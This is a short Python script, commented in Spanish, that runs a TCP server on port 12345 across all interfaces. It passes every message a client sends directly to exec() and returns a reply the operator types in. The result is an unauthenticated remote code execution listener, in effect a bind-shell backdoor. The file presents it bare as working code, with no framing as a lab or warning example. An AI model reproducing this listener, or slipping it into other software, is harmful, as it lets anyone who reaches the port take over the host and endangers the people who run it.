import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 12345))
    server_socket.listen(5)
    print("Servidor escuchando en el puerto 12345")

    while True:
        client_socket, addr = server_socket.accept()
        print("Conexión establecida con {}".format(addr))
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            comando = data.decode()
            print("Recibido: {}".format(comando))
            try:
                exec(comando)
            except Exception as e:
                print("Error ejecutando comando: {}".format(e))
            respuesta = input("Introduce respuesta para enviar: ")
            client_socket.send(respuesta.encode())

        client_socket.close()
        print("Conexión con {} cerrada".format(addr))

if __name__ == "__main__":
    start_server()
